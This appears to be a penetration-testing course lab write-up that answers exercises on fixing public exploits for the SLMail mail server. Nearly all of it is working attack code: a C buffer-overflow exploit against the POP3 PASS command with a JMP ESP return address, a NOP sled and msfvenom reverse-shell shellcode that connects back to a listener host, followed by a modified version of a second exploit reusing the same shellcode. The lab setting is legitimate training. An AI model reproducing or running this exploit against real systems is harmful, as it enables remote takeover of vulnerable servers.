<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Exercises9.2.3-Public Exploits</title>
</head><body>9.2.3 - Exercises<br/>
1. Fix and compile 643.c to exploit your SLMail installation<br/>
2. Fix and compile 646.c under Linux using mingw<br/>
<br/>
1.<br/>
Shell obtained with revised code from 643.c:<br/>
<img src="screenshot.png" /><br/>
<br/>
root@:~/labs/exploits&gt; cat 643.c<br/>
#include &lt;arpa/inet.h&gt;<br/>
#include &lt;unistd.h&gt;<br/>
#include &lt;fcntl.h&gt;<br/>
#include &lt;stdio.h&gt;<br/>
#include &lt;stdlib.h&gt;<br/>
#include &lt;sys/socket.h&gt;<br/>
#include &lt;sys/types.h&gt;<br/>
#include &lt;sys/wait.h&gt;<br/>
#include &lt;errno.h&gt;<br/>
#include &lt;netinet/in.h&gt;<br/>
#include &lt;netdb.h&gt;<br/>
#include &lt;string.h&gt;<br/>
<br/>
#define retadd <b>"\x8f\x35\x4a\x5f" /* JMP ESP in SLMFC.dll 0x5f4a358f */</b><br/>
#define port 110<br/>
<br/>
/* msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.187 LPORT=443 EXITFUNC=th &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;read -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai */<br/>
/* revshell */<br/>
char shellcode[] =<br/>
<b>"\xbb\x88\x9d\x35\x4f\xda\xce\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"<br/>
"\x52\x31\x5d\x12\x03\x5d\x12\x83\x4d\x99\xd7\xba\xb1\x4a\x95"<br/>
"\x45\x49\x8b\xfa\xcc\xac\xba\x3a\xaa\xa5\xed\x8a\xb8\xeb\x01"<br/>
"\x60\xec\x1f\x91\x04\x39\x10\x12\xa2\x1f\x1f\xa3\x9f\x5c\x3e"<br/>
"\x27\xe2\xb0\xe0\x16\x2d\xc5\xe1\x5f\x50\x24\xb3\x08\x1e\x9b"<br/>
"\x23\x3c\x6a\x20\xc8\x0e\x7a\x20\x2d\xc6\x7d\x01\xe0\x5c\x24"<br/>
"\x81\x03\xb0\x5c\x88\x1b\xd5\x59\x42\x90\x2d\x15\x55\x70\x7c"<br/>
"\xd6\xfa\xbd\xb0\x25\x02\xfa\x77\xd6\x71\xf2\x8b\x6b\x82\xc1"<br/>
"\xf6\xb7\x07\xd1\x51\x33\xbf\x3d\x63\x90\x26\xb6\x6f\x5d\x2c"<br/>
"\x90\x73\x60\xe1\xab\x88\xe9\x04\x7b\x19\xa9\x22\x5f\x41\x69"<br/>
"\x4a\xc6\x2f\xdc\x73\x18\x90\x81\xd1\x53\x3d\xd5\x6b\x3e\x2a"<br/>
"\x1a\x46\xc0\xaa\x34\xd1\xb3\x98\x9b\x49\x5b\x91\x54\x54\x9c"<br/>
"\xd6\x4e\x20\x32\x29\x71\x51\x1b\xee\x25\x01\x33\xc7\x45\xca"<br/>
"\xc3\xe8\x93\x5d\x93\x46\x4c\x1e\x43\x27\x3c\xf6\x89\xa8\x63"<br/>
"\xe6\xb2\x62\x0c\x8d\x49\xe5\x39\x59\x51\x4e\x55\x5f\x51\xb1"<br/>
"\x1d\xd6\xb7\xdb\x71\xbf\x60\x74\xeb\x9a\xfa\xe5\xf4\x30\x87"<br/>
"\x26\x7e\xb7\x78\xe8\x77\xb2\x6a\x9d\x77\x89\xd0\x08\x87\x27"<br/>
"\x7c\xd6\x1a\xac\x7c\x91\x06\x7b\x2b\xf6\xf9\x72\xb9\xea\xa0"<br/>
"\x2c\xdf\xf6\x35\x16\x5b\x2d\x86\x99\x62\xa0\xb2\xbd\x74\x7c"<br/>
"\x3a\xfa\x20\xd0\x6d\x54\x9e\x96\xc7\x16\x48\x41\xbb\xf0\x1c"<br/>
"\x14\xf7\xc2\x5a\x19\xd2\xb4\x82\xa8\x8b\x80\xbd\x05\x5c\x05"<br/>
"\xc6\x7b\xfc\xea\x1d\x38\x1c\x09\xb7\x35\xb5\x94\x52\xf4\xd8"<br/>
"\x26\x89\x3b\xe5\xa4\x3b\xc4\x12\xb4\x4e\xc1\x5f\x72\xa3\xbb"<br/>
</b><b>"\xf0\x17\xc3\x68\xf0\x3d"</b>;<br/>
<br/>
struct sockaddr_in plm,lar,target;<br/>
<br/>
int conn(char *ip)<br/>
{<br/>
&nbsp;int sockfd;<br/>
&nbsp;plm.sin_family = AF_INET;<br/>
&nbsp;plm.sin_port = htons(port);<br/>
&nbsp;plm.sin_addr.s_addr = inet_addr(ip);<br/>
&nbsp;bzero(&amp;(plm.sin_zero),8);<br/>
&nbsp;sockfd = socket(AF_INET,SOCK_STREAM,0);<br/>
if((connect(sockfd,(struct sockaddr *)&amp;plm,sizeof(struct sockaddr))) &lt; 0)<br/>
{<br/>
&nbsp;perror("[-] connect error!");<br/>
&nbsp;exit(0);<br/>
}<br/>
&nbsp;printf("[*] Connected to: %s.\n",ip);<br/>
&nbsp;return sockfd;<br/>
}<br/>
<br/>
int main(int argc, char *argv[])<br/>
{<br/>
&nbsp; &nbsp; int xs;<br/>
&nbsp; &nbsp; char out[1024];<br/>
&nbsp; &nbsp; char *buffer = malloc(<b>3500</b>); /* Size of buffer. */<br/>
&nbsp; &nbsp; memset(buffer, 0x00, <b>3500</b>); /* Zero out what is in the buffer. */<br/>
&nbsp; &nbsp; char *off = malloc(<b>2607</b>); /* Begin with these bytes in the buffer. */<br/>
&nbsp; &nbsp; memset(off, 0x00, <b>2607</b>); /* Zero out what is in the off char. C looks for a null terminated sequence of characters to end the string. */<br/>
&nbsp; &nbsp; memset(off, 0x41, <b>2606</b>); /* Place "A"s for the first set of bytes. */<br/>
&nbsp; &nbsp; char *nop = malloc(<b>17</b>); /* Define the NOP slide. */<br/>
&nbsp; &nbsp; memset(nop, 0x00, <b>17</b>); /* Zero out what is in the NOP slide. */<br/>
&nbsp; &nbsp; memset(nop, 0x90, <b>16</b>); /* Fill all but the last byte of the NOP slide. */<br/>
&nbsp; &nbsp; strcat(buffer, off); /* Fill the first part of the buffer with the "A"s. */<br/>
&nbsp; &nbsp; strcat(buffer, retadd); /* Fill the next part of the buffer with the JMP ESP memory address. */<br/>
&nbsp; &nbsp; strcat(buffer, nop); /* FIll the next part of the buffer with the NOPs. */<br/>
&nbsp; &nbsp; strcat(buffer, shellcode); /* Fill the next part of the buffer with the shellcode. */<br/>
<br/>
&nbsp; &nbsp; printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");<br/>
<br/>
&nbsp; &nbsp; xs = conn("<b>10.11.10.124</b>");<br/>
&nbsp; &nbsp; read(xs, out, 1024);<br/>
&nbsp; &nbsp; printf("[*] %s", out);<br/>
&nbsp; &nbsp; write(xs,"USER username\r\n", 15);<br/>
&nbsp; &nbsp; read(xs, out, 1024);<br/>
&nbsp; &nbsp; printf("[*] %s", out);<br/>
&nbsp; &nbsp; write(xs,"PASS ",5);<br/>
&nbsp; &nbsp; write(xs,buffer,strlen(buffer));<br/>
&nbsp; &nbsp; printf("Shellcode len: %d bytes\n",strlen(shellcode));<br/>
&nbsp; &nbsp; printf("Buffer len: %d bytes\n",strlen(buffer));<br/>
&nbsp; &nbsp; write(xs,"\r\n",4);<br/>
&nbsp; &nbsp; close(xs);<br/>
}<br/>
<br/>
2.<br/>
Shell obtained after fixing 646.c code:<br/>
<img src="screenshot 2.png" /><br/>
<br/>
Change this part of the code:<br/>
unsigned char shellcode[] = <br/>
<b>"\xbb\x88\x9d\x35\x4f\xda\xce\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"<br/>
"\x52\x31\x5d\x12\x03\x5d\x12\x83\x4d\x99\xd7\xba\xb1\x4a\x95"<br/>
"\x45\x49\x8b\xfa\xcc\xac\xba\x3a\xaa\xa5\xed\x8a\xb8\xeb\x01"<br/>
"\x60\xec\x1f\x91\x04\x39\x10\x12\xa2\x1f\x1f\xa3\x9f\x5c\x3e"<br/>
"\x27\xe2\xb0\xe0\x16\x2d\xc5\xe1\x5f\x50\x24\xb3\x08\x1e\x9b"<br/>
"\x23\x3c\x6a\x20\xc8\x0e\x7a\x20\x2d\xc6\x7d\x01\xe0\x5c\x24"<br/>
"\x81\x03\xb0\x5c\x88\x1b\xd5\x59\x42\x90\x2d\x15\x55\x70\x7c"<br/>
"\xd6\xfa\xbd\xb0\x25\x02\xfa\x77\xd6\x71\xf2\x8b\x6b\x82\xc1"<br/>
"\xf6\xb7\x07\xd1\x51\x33\xbf\x3d\x63\x90\x26\xb6\x6f\x5d\x2c"<br/>
"\x90\x73\x60\xe1\xab\x88\xe9\x04\x7b\x19\xa9\x22\x5f\x41\x69"<br/>
"\x4a\xc6\x2f\xdc\x73\x18\x90\x81\xd1\x53\x3d\xd5\x6b\x3e\x2a"<br/>
"\x1a\x46\xc0\xaa\x34\xd1\xb3\x98\x9b\x49\x5b\x91\x54\x54\x9c"<br/>
"\xd6\x4e\x20\x32\x29\x71\x51\x1b\xee\x25\x01\x33\xc7\x45\xca"<br/>
"\xc3\xe8\x93\x5d\x93\x46\x4c\x1e\x43\x27\x3c\xf6\x89\xa8\x63"<br/>
"\xe6\xb2\x62\x0c\x8d\x49\xe5\x39\x59\x51\x4e\x55\x5f\x51\xb1"<br/>
"\x1d\xd6\xb7\xdb\x71\xbf\x60\x74\xeb\x9a\xfa\xe5\xf4\x30\x87"<br/>
"\x26\x7e\xb7\x78\xe8\x77\xb2\x6a\x9d\x77\x89\xd0\x08\x87\x27"<br/>
"\x7c\xd6\x1a\xac\x7c\x91\x06\x7b\x2b\xf6\xf9\x72\xb9\xea\xa0"<br/>
"\x2c\xdf\xf6\x35\x16\x5b\x2d\x86\x99\x62\xa0\xb2\xbd\x74\x7c"<br/>
"\x3a\xfa\x20\xd0\x6d\x54\x9e\x96\xc7\x16\x48\x41\xbb\xf0\x1c"<br/>
"\x14\xf7\xc2\x5a\x19\xd2\xb4\x82\xa8\x8b\x80\xbd\x05\x5c\x05"<br/>
"\xc6\x7b\xfc\xea\x1d\x38\x1c\x09\xb7\x35\xb5\x94\x52\xf4\xd8"<br/>
"\x26\x89\x3b\xe5\xa4\x3b\xc4\x12\xb4\x4e\xc1\x5f\x72\xa3\xbb"<br/>
</b><b>"\xf0\x17\xc3\x68\xf0\x3d";</b><br/>
<br/>
void exploit(int sock) {<br/>
&nbsp; &nbsp; &nbsp; FILE *test;<br/>
&nbsp; &nbsp; &nbsp; int *ptr;<br/>
&nbsp; &nbsp; &nbsp; char userbuf[] = "USER madivan\r\n";<br/>
&nbsp; &nbsp; &nbsp; char evil[3001]; // Size of evil char. <br/>
&nbsp; &nbsp; &nbsp; char buf[3012]; // Size of buffer.<br/>
&nbsp; &nbsp; &nbsp; char receive[1024];<br/>
&nbsp; &nbsp; &nbsp; char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;"\x90\x90\x90\x90\x90\x90\x90\x90";<br/>
&nbsp; &nbsp; &nbsp; memset(buf, 0x00, 3012); // Zero out the buffer.<br/>
&nbsp; &nbsp; &nbsp; memset(evil, 0x00, 3001); // Zero out what is in the evil char.<br/>
&nbsp; &nbsp; &nbsp; memset(evil, 0x43, 3000); // Fill all but the last byte of the evil char with "C"s before the NOP sled.<br/>
&nbsp; &nbsp; &nbsp; ptr = &amp;evil; // The ptr is the address of the evil char.<br/>
&nbsp; &nbsp; &nbsp; ptr = ptr + 652; // 652 ints is 2608 chars. <br/>
&nbsp; &nbsp; &nbsp; memcpy(ptr, &amp;nopsled, 16); // Copy 16 bytes from the nopsled to the ptr.<br/>
&nbsp; &nbsp; &nbsp; ptr = ptr + 4; // Add 16 chars to the ptr.<br/>
&nbsp; &nbsp; &nbsp; memcpy(ptr, &amp;shellcode, <b>351</b>); // Copy 351 bytes of shellcode to the ptr.<br/>
&nbsp; &nbsp; &nbsp; *(long*)&amp;evil[<b>2606</b>] = 0x<b>5F4A358F</b>; /* JMP ESP in SLMFC.dll 0x5f4a358f */<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>